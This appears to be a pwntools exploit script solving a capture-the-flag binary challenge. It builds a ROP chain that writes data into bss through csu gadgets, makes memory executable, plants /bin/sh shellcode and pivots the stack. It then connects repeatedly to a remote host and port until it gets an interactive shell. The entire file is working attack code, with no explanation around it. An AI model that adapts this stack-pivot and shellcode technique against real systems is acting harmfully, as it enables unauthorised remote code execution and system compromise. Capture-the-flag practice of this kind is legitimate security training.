from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('chall')
libc = elf.libc

pop_r14_r15 = 0x00000000004013e0
pop_rsp_r13 = 0x00000000004013dd
pop_r13 = 0x00000000004013de
pushin = 0x0000000000401384
ret = 0x40101a
write_rbp = 0x000000000040113c
prdi = 0x00000000004013e3
prsi_pr15 = 0x00000000004013e1
popcsu = 0x00000000004013da
movcsu = 0x00000000004013c0
bss = 0x404068

def shellcode_time(where, what):
    res = b""
    for i in range(0,len(what),4):
        data = u32(what[i:i+4].ljust(4,b'\x00'))
        res += www(where + i, data)
    return res

def www(where, what):
    pay = p64(popcsu) + p64(what) + p64(where + 0x3d) + p64(0) * 4 + p64(write_rbp)
    return pay

while True:
    p = remote('34.101.122.7',10001)
    pay = b'A' * 128 + b'B' * 128 + b'C' * 128
    p.sendafter(b': ', pay)

    payload = www(bss + 0x8, ret)
    payload += www(bss + 0x10, pop_r14_r15)
    payload += www(bss + 0x28, pop_r14_r15)
    payload += www(bss + 0x40, pushin)
    payload += www(bss + 0x48, popcsu)
    payload += www(bss + 0x50, 0xfff2b3e0)
    payload += www(bss + 0x58, 0x4040d5)
    payload += www(bss + 0x80, write_rbp)

    payload += www(bss + 0x88, popcsu)
    payload += www(bss + 0x98, 1)
    payload += www(bss + 0xa0, 0x404000)
    payload += www(bss + 0xa8, 0x1000)
    payload += www(bss + 0xb0, 7)
    payload += www(bss + 0xb8, 0x404098)
    payload += www(bss + 0xc0, movcsu)

    payload += www(bss + 0x100, bss + 0x200)
    payload += shellcode_time(bss + 0x200, asm(shellcraft.sh()))
    payload += p64(pop_rsp_r13) + p64(0x404060)

    try:
        p.sendlineafter(b': ', cyclic(9,n=8)+ payload)
        p.sendline(b'ls')
        p.interactive()
    except Exception as e:
        continue

    p.close()
